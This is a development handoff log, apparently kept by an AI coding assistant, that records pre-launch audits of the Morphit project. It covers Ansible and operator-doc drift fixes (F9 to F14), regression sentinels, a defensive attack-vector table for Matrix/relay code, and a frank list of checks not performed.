No new sentinel for the avatar work since these are not security findings — they're a UX gap-close. The existing locale-parity smoke already pins all 10 locales carry the new keys.

### Sysadmin docs verification (Ken's "verify, don't assume" question)

Ken: "pre launch, operations, run a morphit node, and the setup wizard are absolutely perfect now, right? basically, every doc that the sysadmin needs to read before and as he begins and does the first install of morphit onto our vps. don't assume, verify."

**Verified — actual things checked:**

- ✅ **All four docs exist** at their referenced paths: `docs/PRE-LAUNCH-CHECKLIST.md`, `docs/OPERATIONS.md`, `docs/RUN-A-MORPHIT-NODE.md`. The "setup wizard" is `morphit-ops init` (in `apps/ops-cli/src/commands/init.ts`) — verified all 17 wizard steps actually exist as functions in `apps/ops-cli/src/init/steps.ts`.
- ✅ **All cross-referenced docs exist**: LAUNCH-DAY.md, POST-LAUNCH-WEEK-ONE.md, PRE-LAUNCH-CHECKLIST.md, OPERATIONS.md, RUN-A-MORPHIT-NODE.md, REVISIT-LIST.md all present.
- ✅ **All referenced `morphit-ops` commands exist in code**: init.ts, edit.ts, register.ts present in `apps/ops-cli/src/commands/`.
- ✅ **XMR view-key references**: every reference is in retired-script-archaeology context (e.g., "Part 109 removed the `MORPHIT_INDEXER_XMR_FEE_VIEWKEY` env var"). No live references that an operator would mistake as still-required.
- ✅ **ADR count**: 23 ADRs on disk; no doc claims a stale count.
- ✅ **F11 fix from earlier in cp5 is live** in RUN-A-MORPHIT-NODE.md (lines 798 + 1094 both have correct `chown morphit-relay:morphit-relay /etc/morphit/relay.env`).
- ✅ **OPERATIONS.md does NOT have the F11-class drift**: lines 6334-6336 already had correct per-daemon chown (`morphit:morphit` for indexer.env; `morphit-relay:morphit-relay` for relay.env).
- ❌ **F14 (MEDIUM) — Stale wizard step number in OPERATIONS.md.** Line 4748 said `'morphit-ops init' step 12 asks: "Enable daily DB backup automation?"`. But the wizard reorganization at Part 109 (added stepFeeExplorers + stepChatLinkExplorers) plus subsequent additions pushed `stepBackup` from step 12 to step 15. A sysadmin reading the doc, getting to "step 12" expecting a backup-automation prompt, would instead see a chat-link-explorers prompt and get confused. Same drift class as cp5's F11 (doc vs. shipped artifact). Fixed by updating to "step 15".

**F14 sentinel — `P122-CP5-F14`** pins both legs of the contract:
- (a) `OPERATIONS.md` references "step 15" for backup (matches stepBackup's actual position in `init.ts`)
- (b) `mustNotHave` rejects the pre-fix "step 12" wording

Plus **`P122-CP5-F14b`** pins `TOTAL_STEPS = 17` in steps.ts. If a future wizard restructure changes the count, this sentinel fails and forces a re-audit of doc step references at the same turn.

**Things NOT verified this turn (honest disclosure):**
- I did not end-to-end-run every command in every doc against a clean VM (sandbox can't host one).
- I did not walk every step of the 8,167-line OPERATIONS.md for further off-by-N drifts; I checked the explicit wizard-step references but not, e.g., the RAID-recovery procedures or the BunkerWeb tuning section.
- I did not verify every i18n string in the setup wizard matches its code reference.
- I did not verify sub-section ordering inside the 1,896-line RUN-A-MORPHIT-NODE.md.

What I checked is a high-confidence sanity scan focused on the drift classes cp5 surfaced (doc vs. shipped artifact vs. code). The four docs are MORE consistent than they were pre-cp5, but "absolutely perfect" would require a live-deploy walkthrough that the sandbox can't perform. Memory's "Live full-stack Ansible deploy against a fresh Ubuntu 24.04 VM" is still in PENDING and remains the highest-confidence way to surface any remaining handoff drift.

### Standing-revisit follow-ons from cp5 (not done this turn)

These were listed at cp5-close. The first two would each be ~50 lines of new smoke logic — meaningful but a proper checkpoint of their own (cp6), not a quick-turn fix:

- **Smoke: every shipped `User=` in `ops/systemd/*.service` has a matching Ansible user-creation task.** Would have caught F12 mechanically. File-walking smoke that parses systemd unit files + walks Ansible role tasks. Filed for cp6 if Part 122 continues.
- **Smoke: every env var in an Ansible `*.env.j2` template has a `process.env.X` consumer in the code workspace.** Would have caught F13 mechanically. File-walking smoke that parses Jinja templates + greps apps/ for env-var consumers. Filed for cp6.
- **ansible-lint integration in CI.** Style check, not correctness. Belongs in `.forgejo/workflows/`.

**Brag list:** 265 entries unchanged. cp5-fix is internal handoff polish + a UX gap-close — neither is a stranger-cares-about win that belongs in the brag list.

**This session's arc (cp22 → P122 cp5-fix):**
1. cp22 → P122 cp1-cp5 as previously documented
2. **P122 cp5-fix** — avatar-upload UX gap close (Ken's question — input filesize gate + UI bullet + 10-locale strings) + F14 stale wizard step-number doc drift (discovered during the doc verification Ken requested) + 2 new sentinels

**Resume directive:** Read this block, then `docs/REVISIT-LIST.md`'s "Last maintained" entry (still on cp5 — cp5-fix is a same-checkpoint follow-on, not a new sealed checkpoint).

---

**Tarball:** `morphit-audit-2026-05-122-cp5-fix-delta.tar.gz` — delta over the cp5 tarball.

**Previous tarball:** `morphit-audit-2026-05-122-cp5-delta.tar.gz` (sysadmin-handoff threat-model walk; F10/F11/F12/F13 closed).

---

**Gates — all green:**
- Triple-pulse: **2,963 × 3 scenarios, 0 failures** (cp4 baseline 2,959 → cp5 baseline 2,963 = +4 = P122-CP5-F10/F11/F12/F13 sentinels)
- Typecheck-sweep: 0 errors across all 9 workspaces
- YAML parse verified across all touched Ansible files
- ansible-lint: NOT re-verified this checkpoint (sandbox-environmental)

**Brag list:** 265 entries unchanged. cp5 work is internal handoff-discipline + security hardening — per cp19 discipline, audit findings go to AUDIT doc, not brag list.

**cp5 trigger.** Ken's "go" after cp4 sealed. Cp4 closed Matrix/relay black-hat redux with the F9 paired-session contract drift. Cp5 takes the **operator's perspective** for the first time in Part 122: the threat model is "Sally-operator follows the handoff docs literally — what could go wrong?" The audit surface is privilege-escalation paths during handoff, env-file misconfiguration, doc-vs-shipped-systemd-vs-Ansible drift. This kind of audit can ONLY find findings by walking through three layers in parallel: (a) the human-facing docs the operator reads, (b) the shipped systemd units / env templates the operator deploys, (c) the Ansible playbook that's supposed to do the same work automatically. Inconsistencies between these three layers are operator traps.

**Four real findings, all SHIPPED in cp5:**

- **F10 (HIGH) — Jinja variable-name typo in Ansible npm-install task.** `ops/ansible/roles/morphit/tasks/clone_and_build.yml` line 28 had `changed_when: "'changed' in morphit_npm_install_result.stdout or 'added' in npm_install_result.stdout"`. The first reference matches the registered name; the second reference uses `npm_install_result` which is NEVER registered. When npm produces output without 'changed' (the typical first-install case — "added N packages" but no "changed"), Jinja evaluates the undefined variable and Ansible aborts the playbook with `'npm_install_result' is undefined`. Pre-cp5 the playbook would 100% fail on first deploy. Fix: aligned both clauses on `morphit_npm_install_result.stdout`.
- **F11 (MEDIUM) — Operator-doc ownership inconsistency with shipped systemd unit.** `docs/RUN-A-MORPHIT-NODE.md` previously had `sudo chown morphit:morphit /etc/morphit/indexer.env /etc/morphit/relay.env` as a single command. But: the shipped `ops/systemd/morphit-relay.service` specifies `User=morphit-relay / Group=morphit-relay`, and the env-file header guidance in `ops/env/relay.env.example` also says `chown morphit-relay:morphit-relay`. An operator following the literal doc would chown the relay's env file to a user the relay daemon doesn't run as → relay boot fails with "Permission denied". Loud-failure but unnecessary friction. Fix: split the chown into per-file commands targeting the correct daemon user, with explanation of why each file goes to a different user (smaller blast radius on relay compromise).
- **F12 (HIGH) — Ansible playbook never creates the `morphit-relay` system user.** Both `morphit-relay.service` and `morphit-relay-mint-acts.service` ship with `User=morphit-relay`. The Ansible base role created `morphit_service_user` (= morphit) and `morphit_service_group` (= morphit) but NEVER created the separate `morphit-relay` user. When the morphit role tried to `systemctl enable + start morphit-relay`, systemd would fail with "User morphit-relay does not exist." Pre-cp5 the entire Ansible deploy path was broken on first deploy — and given memory's "Live full-stack Ansible deploy" is in PENDING, this was never live-tested and would have hit operators on launch day. Fix: added "Create morphit-relay system group" + "Create morphit-relay system user" tasks to `ops/ansible/roles/base/tasks/main.yml`. The user is added to `morphit_service_group` so it can read `/etc/morphit/relay.env` (chowned `root:morphit_service_group` mode 0640 by the morphit role).
- **F13 (LOW) — Dead `MORPHIT_RELAY_PASSPHRASE` env var in relay.env.j2 invites passphrase leak to disk.** The Ansible relay.env.j2 template shipped `MORPHIT_RELAY_PASSPHRASE={{ morphit_relay_keystore_passphrase }}` and a corresponding group_vars/all.yml var with default `'CHANGE-ME-PASSPHRASE'`. But NO code path consumes this env var — the relay's encrypted-envelope keystore unlocks via interactive TTY prompt (`StandardInput=tty-force` on the systemd unit) or systemd `LoadCredential=` for the mint-acts timer. An operator seeing this placeholder in their `/etc/morphit/relay.env` might think they need to put their real passphrase there, leaking it to a 0640 disk file. Fix: removed the template line; removed the group_vars var; replaced vault.yml.example slot with a "REMOVED" placeholder + explanatory comment in the template documenting why it doesn't exist.

**Audit conclusion — handoff surface in 4-finding shape post-cp5.** All four are concrete code/doc changes (not abstract recommendations). Two were hard-fail-on-first-deploy bugs (F10, F12), one was unnecessary-operator-friction (F11), one was a security-shaped trap (F13). After cp5, the Ansible deploy path is internally consistent for the first time — every User= referenced in a shipped systemd unit corresponds to an Ansible user-creation task; every chown directive in the docs matches the daemon that actually reads the file; every env var referenced in a template is actually consumed by code.

**This session's arc (cp22 → P122 cp5):**
1. **cp22** — Sidecar-envelope-smoke flake fix; sysadmin-handoff persona walk; mount-sweep skip-list; TS6133 regex; upload-artifact SHA-pin.
2. **P122 cp1** — Black-hat audit of cp20-cp22 delta surfaces. F1 + F2 closed.
3. **P122 cp2** — F3 + F4 audit sweep: existing defenses hold. F5 schema-migration drift sentinel.
4. **P122 cp3** — DNS-rebinding closure (cp7 REVISIT §A). Three-layer defense + 45-scenario smoke.
5. **P122 cp4** — Matrix/relay black-hat redux. 25/26 AVs clean. F9 paired-session contract drift closed.
6. **P122 cp5** — Pre-launch sysadmin-handoff threat-model walk. 4 findings (F10/F11/F12/F13) closed across Ansible playbook + operator docs + env templates.

**Parked work:** Upgrade tooling — first-release week (~2026-05-22). See memory entry #29.

**Truly pending:**
- Live full-stack Ansible deploy against a fresh Ubuntu 24.04 VM (much higher confidence post-cp5 that this will actually succeed first try)
- Real `v*` tag push to validate `.forgejo/workflows/release.yml` end-to-end
- Relay-side response types extracted into `@morphit/relay-client`
- PHASE F: apply schema-as-contract pattern as first contract layer
- F7 (LOW) — S-12 ariaLabel sentinel regex-based; needs `assertNoRegexMatch` primitive
- F8 (LOW) — tighter F5 catch: parse schema.sql for highest version, cross-check vs MIGRATIONS[]
- ansible-lint integration in CI (style check, not correctness)
- Smoke runner that asserts every shipped systemd unit's `User=` has a matching Ansible user-creation task (cp5 surfaced this gap manually; a smoke could automate it)

**Part 122 scope — post-cp5:** Part 122 plausibly closes here pre-launch. Cp1-cp5 collectively walked: cp20-cp22 delta surfaces (cp1), generalized audit-pattern sweeps (cp2), federation-probe DNS-rebinding closure (cp3), Matrix/relay black-hat redux (cp4), sysadmin-handoff threat model (cp5). That's the full pre-launch deep-deep program. Remaining defects/polish carry forward as standing REVISITs (F7, F8, and a few smaller items). Launch ~2026-05-22.

**Resume directive:** Read this block, then `docs/REVISIT-LIST.md`'s "Last maintained" entry (full cp5 paragraph).

---

**Tarball:** `morphit-audit-2026-05-122-cp5-delta.tar.gz` — delta tarball; cp5 touched zero structural moves and zero file deletions (vault.yml.example line was REPLACED in place, not deleted). Recipe: extract over the cp4 working tree → `git add -A` → commit + push.

**Previous tarball:** `morphit-audit-2026-05-122-cp4-delta.tar.gz` (Matrix/relay black-hat redux).

**Brag list:** 265 entries unchanged. cp4 work is internal audit + small contract-drift fix — per cp19 discipline, security findings go to AUDIT doc, not brag list.

**cp4 audit conclusion: Matrix/relay surfaces are well-defended.** The Matrix DM path (matrix-bot/sendDm + getDmRoom), the alert-body rendering (classifier.ts renderAlertBody with escapeHtml + cp18/19 sanitization), the QR-pair handshake (desktopPairing.ts verifyDeliveryPayload with AAD-bound pid + echo-checks + freshness window + chain-anchored signature verifier with weight-threshold check), the paired-readonly persistence (pairedSession.ts isValidPairedSession with strict shape validation), the cross-tab storage event handler (identity.ts handleStorageEvent which re-validates via canonical readPairedSession) — all hold up under black-hat enumeration. cp9-cp19 hardening + ADR-0022 design have left the surface in solid shape.

**One real finding shipped:** **F9 (LOW) — defense-contract drift in pairedSession validator.** The `isValidPairedSession` docblock promised "Reject obviously-bogus timestamps (negative, far past, far future)" but the code only enforced negative + far-future. The "far past" leg was missing. Same drift in the test file: `pairedSession.test.ts` has tests for negative + far-future but not far-past. Fix shipped: new `MAX_PAIRED_AGE_SECONDS = 365 * 86400` constant + `if (r.pairedAt < now - MAX_PAIRED_AGE_SECONDS) return false;` check + 2 new vitest cases (rejects 400-days-old, accepts 300-days-old). `P122-CP4-F9` sentinel pins all three legs of the docblock contract (negative + far-future + far-past). Self-tested by tampering. No current downstream consequence (nothing reads pairedAt for age decisions), but the contract-vs-code drift was real and pre-launch is the right time to close it.

**cp4 attack-vector enumeration (full table — 26 AVs):**

| AV | Surface | STRIDE | Disposition |
|----|---------|--------|-------------|
| AV1 | sendDm MXID injection via untyped string | E | NOT_A_BUG — branded MatrixMxid type prevents @↔# confusion at compile time; runtime parser in @morphit/operator-config (P121-CP9-1 sentinel) validates the form |
| AV2 | sendDm HTML body injection via attacker-controlled payload | T | NOT_A_BUG — classifier.renderAlertBody runs escapeHtml on every dynamic field (title, advice, payloadLines, source, ts); tier+sigil are static enums |
| AV3 | Classifier→sendDm content tampering | T | NOT_A_BUG — cp18/19 audit hardened sanitize() (strip C0, defang mxid pills) + cp19 capped payload sizes (1KB/8KB) |
| AV4 | dmRoomCache poisoning | T | NOT_A_BUG — keyed by branded MatrixMxid, populated only from matrix-bot-sdk's getOrCreateDm |
| AV5 | DM-as-stalker: alert body containing data harmful if leaked | I | NOT_A_BUG — body is operator-facing sysadmin alerts, no end-user data |
| AV6 | Crypto store / state.json permissions | I | OS_LEVEL_OOS — files written via matrix-bot-sdk's providers using umask defaults |
| AV7 | Access token leakage via stdout/journal | I | NOT_A_BUG_VERIFIED — main.ts error logs reference mxid but not token; access token only handled by matrix-bot-sdk constructor |
| AV8 | QR payload tampering during photo/print | T | OUT_OF_SCOPE — physical security; signature defends against modification |
| AV9 | Public-key substitution mid-handshake | T | NOT_A_BUG — desktop verifier checks signature against on-chain posting authority via condenser_api.get_accounts |
| AV10 | bootFromPairedSession from-storage tampering | T | NOT_A_BUG — isValidPairedSession validates shape; handleStorageEvent re-reads via canonical validator |
| AV11 | Paired-session escalation readonly→write | E | NOT_A_BUG — bootFromPairedSession refuses when state is 'unlocked' (line 190-194) |
| AV12 | localStorage XSS reads paired session | I | NOT_A_BUG_BY_DESIGN — pairedSession contains ONLY public info (account name + chat pubkey, both on chain) per module docblock |
| AV13 | Cross-jurisdiction shared cookies | I | BROWSER_LEVEL_OOS |
| AV14 | QR captured by camera in shared workspace | T | OUT_OF_SCOPE — physical |
| AV15 | Stale QR replay | T | NOT_A_BUG — QR exp (5min) + signed_at freshness (-120s/+30s) + single-shot pid all in place |
| AV16 | Relay endpoint accepting MXID where room alias expected (or vice versa) | E | NOT_A_BUG — branded types at compile time; runtime parsers validate form |
| AV17 | Invitation token + MXID binding | T | NOT_A_BUG — cp9 audit cleared (memory) |
| AV18 | Relay matrix-related env vars | I | NOT_A_BUG — relay has no matrix-related env vars; matrix lives in matrix-bot service |
| AV19 | QR `relay` URL pointing at private IP | I | NOT_A_BUG_GIVEN_THREAT_MODEL — phone-side validation accepts any https URL; if attacker's QR has `relay: https://127.0.0.1/`, phone's loopback receives the encrypted bundle (which is only public info, signed) — no info leak |
| AV20 | Phone-as-attacker (compromised phone) | E | OUT_OF_SCOPE — phone holds posting key = full account compromise |
| AV21 | Desktop-as-attacker (compromised desktop) | E | OUT_OF_SCOPE — same |
| AV22 | Paired session pairedAt has no max-age | I | **F9 — DEFENSE-CONTRACT DRIFT FIXED** |
| AV23 | Paired-session storage event as cross-tab CSRF | T | NOT_A_BUG — handleStorageEvent uses defense-in-depth pattern: re-validates via canonical readPairedSession (line 449) so even hostile same-origin writes get caught by isValidPairedSession |
| AV24 | AEAD key + ephemeral priv wipe | I | NOT_A_BUG_VERIFIED — sodium.memzero(sharedSecret), sodium.memzero(aeadKey), sodium.memzero(desktopEpkPriv) in finally block of verifyDeliveryPayload |
| AV25 | multisig accounts with split posting key | E | KNOWN_LIMITATION — defaultVerifier returns false for accounts requiring multiple signatures, documented in pairingClient.ts line 242-246 ("Honest limitation: document, don't pretend to support") |
| AV26 | pairingId stored but unused downstream | I | NOT_A_BUG — pairingId is stored as forensic-correlation metadata; never read by any security-decision code path; storage-bounded length cap prevents bloat |

**Audit campaign status:** Part 122 cp4 closed. Matrix/relay surface confirmed well-defended; one real contract-vs-code drift fixed (F9). Pattern lesson generalizes: "defense contracts in docblock comments must match defense reality in code" — same class as cp22's "13 runners" stale claim, but inside a security-critical validator.

**This session's arc (cp22 → P122 cp4):**
1. **cp22** — Sidecar-envelope-smoke flake fix; sysadmin-handoff persona walk; mount-sweep skip-list; TS6133 regex; upload-artifact SHA-pin.
2. **P122 cp1** — Black-hat audit of cp20-cp22 delta surfaces. F1 (HIGH) security-warning placement + F2 (MEDIUM) apt-monitor observability.
3. **P122 cp2** — F3 + F4 audit sweep: existing defenses hold. F5 (MEDIUM) schema-migration drift sentinel.
4. **P122 cp3** — DNS-rebinding closure (cp7 REVISIT §A). Three-layer defense + 45-scenario unit smoke + P122-CP3 sentinel.
5. **P122 cp4** — Matrix/relay black-hat redux. 26 AVs enumerated; existing defenses hold across the board. F9 (LOW) defense-contract drift in pairedSession validator fixed.

**Parked work:** Upgrade tooling — first-release week (~2026-05-22). See memory entry #29.

**Truly pending:**
- Live full-stack Ansible deploy against a fresh Ubuntu 24.04 VM
- Real `v*` tag push to validate `.forgejo/workflows/release.yml` end-to-end
- Relay-side response types extracted into `@morphit/relay-client`
- PHASE F: apply schema-as-contract pattern as first contract layer
- F7 (LOW) — S-12 ariaLabel sentinel regex-based; needs `assertNoRegexMatch` primitive
- F8 (LOW) — tighter F5 catch: parse schema.sql highest version, cross-check vs MIGRATIONS[]

**Part 122 scope (cp5+):**
- **cp5 — Pre-launch sysadmin-handoff threat-model walk** (privilege-escalation surface during handoff; env-file misconfiguration paths; what could go wrong when an operator follows the docs literally).
- After cp5, Part 122 likely closes pre-launch; remaining defects/polish carry forward as standing REVISITs.

**Resume directive:** Read this block, then `docs/REVISIT-LIST.md`'s "Last maintained" entry (full cp4 paragraph).

---

**Tarball:** `morphit-audit-2026-05-122-cp4-delta.tar.gz` — delta tarball; cp4 touched zero structural moves and zero file deletions. Recipe: extract over the cp3 working tree → `git add -A` → commit + push.

**Previous tarball:** `morphit-audit-2026-05-122-cp3-delta.tar.gz` (DNS-rebinding closure).

**This session's arc (cp22 → P122 cp2):**
1. **cp22** — Characterized + fixed the cp21-disclosed intermittent flake; sysadmin-handoff persona walk caught 4 real drifts; mount-sweep skip-list extended; typecheck-sweep TS6133 regex fixed; `actions/upload-artifact` SHA-pinned.
2. **P122 cp1** — Black-hat audit of cp20-cp22 delta surfaces. Two real findings: F1 (HIGH) security-warning placement, F2 (MEDIUM) apt-monitor silent timeout masking. F3 + F4 filed for cp2.
3. **P122 cp2** — F3 + F4 audit sweep. Both concluded: existing defenses hold up under audit. ONE real finding crystallized: F5 (MEDIUM) — schema-migration drift class. Sentinel landed pinning schema.sql canonical head version. Total suite 2,910 → 2,911 (+1 F5 sentinel). cp1 follow-ups F3 (sentinel sweep) + F4 (sidecar sweep) closed with empirical "no further fix needed" disposition.

**Parked work (Ken explicitly deferred):**
- **Upgrade tooling** — first-release week (~2026-05-22). See memory entry #29.

**Truly pending (not blocking, just not done):**
- Live full-stack Ansible deploy against a fresh Ubuntu 24.04 VM
- Real `v*` tag push to validate `.forgejo/workflows/release.yml` end-to-end
- Relay-side response types extracted into `@morphit/relay-client` + schema-as-contract pattern applied
- PHASE F (whatever it is): apply schema-as-contract pattern as first contract layer when it lands
- F7 (LOW) — S-12 ariaLabel sentinel could be regex-based for broader coverage (alongside new `assertNoRegexMatch` runner primitive)

**Part 122 scope (cp3+):**
- **cp3 — DNS-rebinding closure in `federationProbe.ts`** (cp7 REVISIT §A). Pre-launch is *now*.
- **cp4 — Matrix/relay black-hat redux** (sendDm + room handling + bootFromPairedSession + QR-pair handshake; added cp9, never reaudited adversarially).
- **cp5 — Pre-launch sysadmin-handoff threat-model walk** (privilege-escalation surface during handoff; env-file misconfiguration paths).

**Resume directive:** Read this block, then `docs/REVISIT-LIST.md`'s "Last maintained" entry (full cp2 paragraph). Both together = exact resume point.

---

**Tarball:** `morphit-audit-2026-05-122-cp2-delta.tar.gz` — delta tarball; cp2 touched zero structural moves and zero file deletions. Recipe: extract over the cp1 working tree → `git add -A` → commit + push.

**Previous tarball:** `morphit-audit-2026-05-122-cp1-delta.tar.gz` (closed cp1 F1+F2; F3+F4 filed for cp2).

## Part 122 cp5 — pre-launch sysadmin-handoff threat-model walk; 4 findings (F10 HIGH, F11 MEDIUM, F12 HIGH, F13 LOW) closed

### Pretext

Cp4 closed the Matrix/relay code surface with the F9 paired-session contract drift. Cp5 was filed at cp4-close as "Pre-launch sysadmin-handoff threat-model walk — privilege-escalation surface during handoff; env-file misconfiguration paths; what could go wrong when an operator follows the docs literally." Ken's directive: "go".

### What's different about this audit

Cp1-cp4 audited code paths. Cp5 audited **the human-in-the-loop deployment surface** — qualitatively different. The threat model is "Sally-operator follows the handoff docs literally — what fails on first deploy?" This kind of audit can ONLY find findings by walking three layers in parallel:

1. **The human-facing docs** the operator reads (RUN-A-MORPHIT-NODE.md, PRE-LAUNCH-CHECKLIST.md)
2. **The shipped systemd units + env templates** the operator deploys (ops/systemd/*.service, ops/env/*.example)
3. **The Ansible playbook** that automates the same work (ops/ansible/)

Inconsistencies between any two are operator traps. Pure code audit can't surface them.

### Audit method

- Surveyed `docs/` for operator-facing handoff docs (PRE-LAUNCH-CHECKLIST.md, RUN-A-MORPHIT-NODE.md, OPERATIONS.md).
- Surveyed `ops/env/*.example` files for permission guidance + denylist patterns.
- Surveyed `ops/ansible/` playbook + roles for user-creation, file-permission, and template-rendering tasks.
- Cross-referenced every `User=X` in `ops/systemd/*.service` against Ansible user-creation tasks.
- Cross-referenced every `chown X:Y` directive in operator docs against the daemon that actually consumes the file.
- Cross-referenced every env var in Ansible templates against `grep -rn 'process.env.VAR' apps/`.

### Findings

#### F10 (HIGH) — Jinja variable-name typo in Ansible npm-install task

Surface: `ops/ansible/roles/morphit/tasks/clone_and_build.yml` line 28.

Bug: `changed_when: "'changed' in morphit_npm_install_result.stdout or 'added' in npm_install_result.stdout"` — first reference matches registered name; second uses `npm_install_result` which is never registered. When npm produces output without 'changed' (the typical first-install "added N packages" case), Jinja evaluates the undefined variable and Ansible aborts with `'npm_install_result' is undefined`.

Severity HIGH: every fresh deploy hits this. Memory's "Live full-stack Ansible deploy" is in PENDING — this latent defect was waiting for first launch.

Fix: aligned both clauses on `morphit_npm_install_result.stdout`.

#### F11 (MEDIUM) — Operator-doc ownership inconsistency with shipped systemd unit

Surface: `docs/RUN-A-MORPHIT-NODE.md` env-setup section.

Bug: doc had a single combined chown of both env files to `morphit:morphit`. But shipped `ops/systemd/morphit-relay.service` runs as `User=morphit-relay`. Mode 0600 + owner=morphit means the morphit-relay daemon can't read the file → "Permission denied" at boot.

Compounding: the `adduser morphit-relay` step was buried in a sidebar at line 1057, AFTER the chown step at line 786 that required the user to exist. An operator following docs linearly would hit "invalid user/group: morphit-relay" at line 897's `chown morphit-relay:morphit-relay /var/lib/morphit-relay` step BEFORE they got to the sidebar.

Severity MEDIUM: loud failure (not silent) but unnecessary friction.

Fix:
- Split combined-chown into per-daemon commands targeting the correct users.
- Added the `sudo adduser --system --group --no-create-home morphit-relay` command INLINE at the right ordinal step (before any chown that references morphit-relay).
- Added rationale explaining why each env file goes to a different daemon user (smaller blast radius if relay is compromised).

#### F12 (HIGH) — Ansible playbook never creates the `morphit-relay` system user

Surface: `ops/ansible/roles/base/tasks/main.yml`.

Bug: base role creates `morphit_service_user` (= morphit) and `morphit_service_group` (= morphit). Never creates the separate `morphit-relay` user. Both `morphit-relay.service` and `morphit-relay-mint-acts.service` ship with `User=morphit-relay`. When the morphit role's `systemctl enable + start morphit-relay` runs, systemd fails with "User morphit-relay does not exist."

Severity HIGH: entire Ansible deploy path broken on first deploy. Same class as F10.

Fix: added two tasks to base/tasks/main.yml:
- `Create morphit-relay system group`
- `Create morphit-relay system user` — with `groups: "{{ morphit_service_group }}"` membership so the relay can read `/etc/morphit/relay.env` (chowned root:morphit_service_group mode 0640 by the morphit role).

#### F13 (LOW) — Dead `MORPHIT_RELAY_PASSPHRASE` env var invites passphrase leak to disk

Surface: `ops/ansible/roles/morphit/templates/relay.env.j2`.

Bug: template shipped `MORPHIT_RELAY_PASSPHRASE={{ morphit_relay_keystore_passphrase }}` with a group_vars/all.yml default of `'CHANGE-ME-PASSPHRASE'`. But no code path consumes `MORPHIT_RELAY_PASSPHRASE`. The relay's encrypted-envelope keystore unlocks via interactive TTY prompt (ADR-0010 §4; `StandardInput=tty-force` on the systemd unit) or systemd `LoadCredential=` for the mint-acts timer. Never env.

Trap: an operator looking at their rendered `/etc/morphit/relay.env` reasonably concludes "I need to replace this placeholder with my real passphrase." They edit it, leaking the keystore passphrase to a 0640 disk file. Defense-in-depth of the encrypted envelope is now defeated.

Severity LOW: no automatic failure mode; requires operator action to trigger. But design intent (ADR-0010 §4) is explicit that the passphrase should never reach disk.

Fix:
- Removed the template line.
- Replaced group_vars/all.yml var with explanatory comment.
- Replaced vault.yml.example slot with `REMOVED` + comment.
- Added positive comment in relay.env.j2 documenting WHY this env var doesn't exist.

### Sentinels

Each finding gets a sentinel in `apps/web/scripts/persona-walkthrough-smoke.ts`:

- **P122-CP5-F10**: pins corrected `morphit_npm_install_result.stdout` twice; `mustNotHave` ensures the typo can't reappear.
- **P122-CP5-F11**: pins per-daemon chown line; `mustNotHave` rejects the combined-chown.
- **P122-CP5-F12**: pins user-creation tasks + group-membership requirement.
- **P122-CP5-F13**: pins absence + explanatory comment.

F12 self-tested by tampering: removed user-creation task → sentinel correctly fails with `MUST HAVE (not found): "Create morphit-relay system user"` and `MUST HAVE (not found): "groups: \"{{ morphit_service_group }}\""`. Restoration → clean.

### Verification

- Triple-pulse 2,963 × 3, 0 failures (cp4 → cp5 = +4 sentinels)
- Typecheck-sweep 0 errors across all 9 workspaces
- YAML parse verified across all touched Ansible files
- F12 sentinel self-tested by tampering
- ansible-lint NOT re-verified (sandbox)

### Post-cp5 deployment-path state

For the first time in Part 122, the handoff surface is internally consistent across all three layers:
- Every `User=` in a shipped systemd unit → matching Ansible user-creation task
- Every `chown` directive in operator docs → matches the daemon that reads the file
- Every env var in a template → consumed by code

### Pattern lessons

1. **Three-layer audit catches handoff bugs that code-only audit misses.** Walking docs + shipped artifacts + automation in parallel surfaces drift invisible to pure code audit. Pre-launch is the right time; post-launch this audit gets cluttered by real operator bug reports.

2. **"Never live-tested" is itself a finding-class.** F10 + F12 would have hit operators on launch day. Memory's "Live full-stack Ansible deploy" being in PENDING was an accurate alarm bell. Anything in PENDING that gates operator experience deserves static audit before launch.

3. **Dead env vars are security traps, not just dead code.** F13's placeholder doesn't fail anything if left alone, but INVITES a passphrase-to-disk leak. Future templates should pin "every var corresponds to a `process.env.X` consumer" via a smoke.

4. **Loud failures still cost operators time.** F11 fails noisily, but operators may walk away if friction exceeds patience. First-deploy success should be the default.

5. **Pre-existing design correctness ≠ implementation correctness.** ADR-0010 §4 designed the encrypted-envelope unlock correctly. The Ansible template drifted from the design. Same shape as cp4's F9 docblock-vs-code drift but at Ansible-vs-code level. Design audits and implementation audits are NOT the same audit.

### Files modified

```
ops/ansible/roles/morphit/tasks/clone_and_build.yml   (F10)
ops/ansible/roles/base/tasks/main.yml                 (F12)
ops/ansible/roles/morphit/templates/relay.env.j2      (F13)
ops/ansible/group_vars/all.yml                        (F13)
ops/ansible/group_vars/vault.yml.example              (F13)
docs/RUN-A-MORPHIT-NODE.md                            (F11)
apps/web/scripts/persona-walkthrough-smoke.ts         (4 cp5 sentinels)
TARBALL.md                                            (this entry)
docs/REVISIT-LIST.md                                  (cp5 maintained-line)
docs/AUDIT-2026-05.md                                 (cp5 entry)
```

No brag-list edit (audit findings per cp19 discipline). No ADR (no architectural shift; cp5 surfaced implementation drift FROM existing design, not design problems). No locale edits. No schema migration.

### Part 122 close-out

Cp5 plausibly closes Part 122 pre-launch. cp1-cp5 collectively walked:
- **cp1**: cp20-cp22 delta surfaces (black-hat audit of recent additions)
- **cp2**: generalized audit-pattern sweeps + schema-migration drift sentinel
- **cp3**: federation-probe DNS-rebinding closure (cp7 REVISIT §A)
- **cp4**: Matrix/relay black-hat redux (post-cp9 first reaudit)
- **cp5**: sysadmin-handoff threat model (operator's literal-doc-follow path)

That's the full pre-launch deep-deep program. Remaining defects/polish carry forward as standing REVISITs.

---

## Part 122 cp4 — Matrix/relay black-hat redux; F9 (paired-session defense-contract drift) closed

### Pretext

cp3 sealed with the DNS-rebinding closure in federation-probe. cp4 was filed as "Matrix/relay black-hat redux" — the Matrix-side surfaces added cp9 (matrix-bot, sendDm, QR-pair handshake, paired-readonly session) hadn't had a fresh adversarial pass since they shipped. Some had cp18/19 deep-deep coverage on specific subsystems (classifier sanitization, payload caps); the full Matrix-touch surface had not been walked end-to-end as a class.

### Audit surface

| Module | Concern |
|--------|---------|
| `apps/matrix-bot/src/matrix.ts` | sendDm + getDmRoom — the only Matrix I/O path |
| `apps/matrix-bot/src/main.ts` | sendDm callers (digest + CRITICAL + WARN paths) |
| `apps/matrix-bot/src/classifier.ts` | renderAlertBody producing the HTML body sent via sendDm |
| `apps/web/src/lib/auth/desktopPairing.ts` | QR-pair crypto primitives (PURE, no DOM/network) |
| `apps/web/src/lib/auth/pairingClient.ts` | QR-pair desktop-side glue (SSE wait + chain verifier) |
| `apps/web/src/lib/auth/pairingPhoneSigner.ts` | Phone-side bundle signing |
